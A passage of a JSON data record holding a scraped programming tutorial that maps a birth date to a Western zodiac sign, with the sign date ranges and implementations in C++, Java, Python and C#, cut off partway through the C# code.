    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d5daf592844f63d7679cb457af820347",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "For given date of birth, this program displays an astrological sign or Zodiac sign.Examples :\u00a0\u00a0Input : Day = 10, Month = December\nOutput : Sagittarius\nExplanation :\nPeople born on this date have a zodiac Sagittarius.\n\nInput : Day = 7, Month = September\nOutput : Virgo\u00a0Recommended: Please try your approach on {IDE} first, before moving on to the solution.Approach :Although the exact dates can shift plus or minus a day, depending on the year, here are the general zodiac sign dates used by Western (or Tropical) astrology :\u00a0WESTERN ASTROLOGY STAR SIGN DATES :\n\nAries (March 21-April 19)\nTaurus (April 20-May 20)\nGemini (May 21-June 20)\nCancer (June 21-July 22)\nLeo (July 23-August 22)\nVirgo (August 23-September 22)\nLibra (September 23-October 22)\nScorpio (October 23-November 21)\nSagittarius (November 22-December 21)\nCapricorn (December 22-January 19)\nAquarius (January 20-February 18)\nPisces (February 19-March 20) We need to check our mentioned date and month and thus find its equivalent zodiac, i.e which zodiac fits in that particular date as well as month and print its corresponding zodiac sign.Below is the implementation of above approach :\u00a0\u00a0C++// CPP program to display astrological sign// or Zodiac sign for given date of birth#include <bits/stdc++.h>using namespace std;\u00a0void zodiac_sign(int day, string month){\u00a0\u00a0\u00a0\u00a0string astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0cout<<astro_sign;}\u00a0\u00a0\u00a0\u00a0\u00a0// Driver codeint main (){\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0string month = \"may\";\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return 0;}\u00a0// This code is contributed by Gitanjali.Java// Java program to display astrological sign// or Zodiac sign for given date of birthimport java.io.*;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0static void zodiac_sign(int day, String month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0String astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"may\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Taurus\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"june\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Gemini\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"july\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Cancer\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if( month == \"august\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Leo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"september\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Virgo\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"october\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 23)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Libra\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"november\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"scorpio\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0System.out.println(astro_sign);\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// Driver code\u00a0\u00a0\u00a0\u00a0public static void main (String[] args)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0int day = 19;\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0String month = \"may\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month);\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}}\u00a0// This code is contributed by Gitanjali.Python# Python program to display astrological sign# or Zodiac sign for given date of birth\u00a0def zodiac_sign(day, month):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# checks month and date within the valid range\u00a0\u00a0\u00a0\u00a0# of a specified zodiac\u00a0\u00a0\u00a0\u00a0if month == 'december':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Sagittarius' if (day < 22) else 'capricorn'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'january':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Capricorn' if (day < 20) else 'aquarius'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'february':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Aquarius' if (day < 19) else 'pisces'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'march':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Pisces' if (day < 21) else 'aries'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'april':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Aries' if (day < 20) else 'taurus'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'may':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Taurus' if (day < 21) else 'gemini'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'june':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Gemini' if (day < 21) else 'cancer'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'july':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Cancer' if (day < 23) else 'leo'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'august':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Leo' if (day < 23) else 'virgo'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'september':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Virgo' if (day < 23) else 'libra'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'october':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'Libra' if (day < 23) else 'scorpio'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0elif month == 'november':\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 'scorpio' if (day < 22) else 'sagittarius'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(astro_sign)\u00a0\u00a0\u00a0\u00a0\u00a0# Driver codeif __name__ == '__main__':\u00a0\u00a0\u00a0\u00a0day = 19\u00a0\u00a0\u00a0\u00a0month = \"may\"\u00a0\u00a0\u00a0\u00a0zodiac_sign(day, month)C#// C# program to display astrological sign// or Zodiac sign for given date of birthusing System;\u00a0class GFG {\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0static void zodiac_sign(int day, string month)\u00a0\u00a0\u00a0\u00a0{\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0string astro_sign=\"\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// checks month and date within the\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0// valid range of a specified zodiac\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (month == \"december\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 22)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Sagittarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign =\"capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"january\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Capricorn\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"february\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 19)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aquarius\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if(month == \"march\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 21)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Pisces\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0}\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else if (month == \"april\"){\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (day < 20)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = \"Aries\";\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0else\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0astro_sign = 